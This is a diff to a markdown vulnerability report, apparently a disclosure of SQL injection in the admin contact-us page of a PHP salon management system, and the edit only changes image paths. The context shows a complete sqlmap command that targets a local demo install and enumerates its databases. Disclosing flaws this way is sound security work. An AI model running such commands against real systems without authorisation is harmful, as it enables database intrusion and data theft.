@@ -54,14 +54,14 @@ Parameter: mobnumber (POST)
 ## CodeScan
 This vulnerability is found by [IRify](https://github.com/wlingze/IRify_scan/issues/ssa.to) :
 
-![Image](/Management-System-Project-PHP/image/SQL1.png)
+![Image](/Men-Salon-Management-System/image/SQL1.png)
 
 ## Proof by the tool of Sqlmap
 ```bash
 sqlmap  -u  "http://127.0.0.1/msmspdemo/admin/contact-us.php" --data "pagetitle=Contact+Us&email=info%40gmail.com&mobnumber=7896541236&timing=10%3A30+am+to+8%3A30+pm&pagedes=1&submit="  --dbs
 ```
 
-![Image](/Management-System-Project-PHP/image/SQL2.png)+
+![Image](/Men-Salon-Management-System/image/SQL2.png)+
 
 this valnerability validation by [Yakit](https://www.yaklang.io/)
 
